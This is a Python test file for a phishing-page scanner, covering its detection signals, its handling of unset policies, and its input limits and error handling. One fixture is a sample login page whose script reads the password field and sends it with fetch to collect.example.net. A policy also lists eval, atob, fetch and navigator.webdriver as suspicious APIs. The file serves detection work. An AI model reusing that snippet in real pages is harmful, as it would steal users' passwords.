from __future__ import annotations

from L3_SCANNER.models.input import HTMLInput, L3Input
from L3_SCANNER.l3_scanner import L3Scanner, scan_content
from L3_SCANNER.policies.detection import DetectionPolicy
from L3_SCANNER.policies.runtime import RuntimeConfig


def complete_policy() -> DetectionPolicy:
    return DetectionPolicy(
        credential_classifier=lambda field: (
            "password" if field.get("type") == "password" else None
        ),
        brand_identifier=lambda context: None,
        brand_expected_domains={},
        brand_resource_rules={"evaluator": lambda evidence: False},
        dynamic_execution_apis=frozenset({"eval"}),
        decode_methods=frozenset({"atob"}),
        network_apis=frozenset({"fetch"}),
        redirect_apis=frozenset({"location.replace"}),
        anti_bot_properties=frozenset({"navigator.webdriver"}),
        branch_behavior_normalizer=lambda branch: repr(branch.get("observations", [])),
    )


def test_scan_content_uses_one_shared_path_and_returns_all_signals() -> None:
    result = scan_content(
        {
            "original_url": "https://login.example.com/start",
            "document_url": "https://login.example.com/final",
            "html": {
                "content": """
                    <form id="login" method="post" action="https://collect.example.net/">
                      <input id="password" type="password">
                    </form>
                    <script>
                      const p=document.getElementById('password').value;
                      fetch('https://collect.example.net/x', {body:p});
                    </script>
                """,
                "content_type": "text/html",
            },
        },
        complete_policy(),
    )
    assert result["schema_version"] == "1.0"
    assert result["layer"] == "L3"
    assert result["target"]["document_url"] == "https://login.example.com/final"
    assert [item["id"] for item in result["signals"]] == [
        *[f"L3-H-{index:02d}" for index in range(1, 9)],
        *[f"L3-J-{index:02d}" for index in range(1, 10)],
    ]
    indexed = {item["id"]: item for item in result["signals"]}
    assert indexed["L3-H-04"]["detected"] is True
    assert indexed["L3-J-06"]["detected"] is True
    assert result["raw"]["javascript"]["scripts"][0].get("source") is None
    assert "scripts" not in result["raw"]["html"]
    assert "malicious" not in result and "final_verdict" not in result


def test_default_open_policies_remain_unresolved() -> None:
    result = scan_content(
        L3Input(
            "https://example.com",
            "https://example.com",
            HTMLInput('<form><input type="password"></form><script>eval("x")</script>'),
        )
    )
    indexed = {item["id"]: item for item in result["signals"]}
    for signal_id in ("L3-H-01", "L3-H-02", "L3-H-03", "L3-H-05", "L3-H-06"):
        assert indexed[signal_id]["detected"] is None
    for signal_id in (
        "L3-J-01",
        "L3-J-02",
        "L3-J-04",
        "L3-J-05",
        "L3-J-06",
        "L3-J-07",
        "L3-J-08",
        "L3-J-09",
    ):
        assert indexed[signal_id]["detected"] is None


def test_provided_html_is_bounded_and_input_object_is_not_mutated() -> None:
    supplied = L3Input(
        "https://example.com",
        "https://example.com",
        HTMLInput("<p>abcdefghij</p>"),
    )
    result = L3Scanner(runtime=RuntimeConfig(max_html_bytes=8)).scan_content(supplied)
    assert supplied.html.content == "<p>abcdefghij</p>"
    assert result["raw"]["html"]["document"]["parse_succeeded"] is True
    assert any(
        error["code"] == "html_input_limit_exceeded" for error in result["errors"]
    )
    assert all(
        signal["detected"] is not False
        for signal in result["signals"]
        if signal["scanner"] == "html"
    )


def test_missing_html_fails_without_turning_signals_negative() -> None:
    result = scan_content(
        L3Input("https://example.com", "https://example.com", HTMLInput(None))
    )
    assert result["scan"]["status"] == "failed"
    html_signals = [item for item in result["signals"] if item["scanner"] == "html"]
    assert all(item["status"] == "error" for item in html_signals)
    assert all(item["detected"] is None for item in html_signals)


def test_non_html_content_type_is_not_analyzed_as_a_negative_page() -> None:
    result = scan_content(
        L3Input(
            "https://example.com/data",
            "https://example.com/data",
            HTMLInput("{}", content_type="application/json"),
        )
    )
    assert result["scan"]["status"] == "failed"
    assert all(
        signal["detected"] is None
        for signal in result["signals"]
        if signal["scanner"] == "html"
    )
    assert any(
        error["code"] == "unsupported_content_type" for error in result["errors"]
    )
